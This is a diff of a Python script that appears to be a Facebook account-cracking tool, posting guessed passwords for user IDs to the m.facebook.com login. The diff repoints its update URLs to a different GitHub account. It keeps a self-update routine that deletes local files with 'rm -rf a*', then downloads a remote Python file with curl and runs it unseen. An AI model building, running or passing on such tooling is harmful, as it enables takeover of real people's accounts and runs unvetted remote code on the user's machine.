@@ -151,13 +151,13 @@ oks = []
 cps = []
 try:
     print('\n Not working your device\n\033[1;37m Please Wait\033[0;97m\n congratulations working your device ')
-    proxy = requests.get('https://raw.githubusercontent.com/Nasrat99845/Nasrat/main/update.txt').text.splitlines()
+    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
     v = 3.1
-    update = requests.get('https://raw.githubusercontent.com/Nasrat99845/files/main/version.txt').text
+    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
     if str(v) in update:
         os.system('rm -rf a*')
-        os.system('curl -L https://raw.githubusercontent.com/Nasrat99845/Nasrat/main/KOK.py > KOK.py')
-        os.system('python KOK.py')
+        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
+        os.system('python ali.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 def dynamic(text):
@@ -180,7 +180,7 @@ def riaz():
 	if riaz1 =='4':
 		riaz()
 	if riaz1 =='3':
-		os.system('https://www.facebook.com/profile.php?id=100001358458659');riaz()
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100008223934973');riaz()
 	if riaz1 =='2':
 		bangla()
 	else:
@@ -428,7 +428,7 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority':'m.facebook.com',
-			'method':'POST',
+			'method':'GET',
 			'path':'/?tbua=1',
 			'scheme':'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -471,5 +471,4 @@ def rcrack(uid,pwx,tl):
 
 
 riaz()
-
 
